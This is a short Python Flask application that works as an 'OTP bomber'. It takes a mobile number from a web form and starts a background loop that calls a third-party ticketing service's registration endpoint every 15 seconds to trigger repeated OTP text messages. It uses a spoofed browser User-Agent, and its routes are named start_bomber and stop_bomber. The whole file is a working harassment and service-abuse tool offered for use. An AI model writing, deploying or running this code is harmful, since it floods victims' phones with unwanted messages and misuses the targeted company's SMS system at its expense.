import os
import time
import requests
import threading
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# OTP Sending Logic
API_URL = "https://securedapi.confirmtkt.com/api/platform/register?newOtp=true&mobileNumber={}"
DELAY = 15

# Global variable to keep track of active tasks
active_tasks = {}

def send_otp_loop(mobile):
    count = 1
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }
    
    while active_tasks.get(mobile):
        try:
            formatted_url = API_URL.format(mobile)
            response = requests.get(formatted_url, headers=headers, timeout=10)
            print(f"[{mobile}] Sent OTP #{count} - Status: {response.status_code}")
        except Exception as e:
            print(f"Error sending to {mobile}: {e}")
        
        count += 1
        time.sleep(DELAY)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start', methods=['POST'])
def start_bomber():
    mobile = request.form.get('mobile')
    if not mobile or len(mobile) != 10:
        return jsonify({"status": "error", "message": "Invalid Number"})
    
    if mobile not in active_tasks or not active_tasks[mobile]:
        active_tasks[mobile] = True
        thread = threading.Thread(target=send_otp_loop, args=(mobile,))
        thread.daemon = True
        thread.start()
        return jsonify({"status": "success", "message": f"Started for {mobile}"})
    return jsonify({"status": "info", "message": "Already running for this number"})

@app.route('/stop', methods=['POST'])
def stop_bomber():
    mobile = request.form.get('mobile')
    if mobile in active_tasks:
        active_tasks[mobile] = False
        return jsonify({"status": "success", "message": f"Stopped for {mobile}"})
    return jsonify({"status": "error", "message": "Not running"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
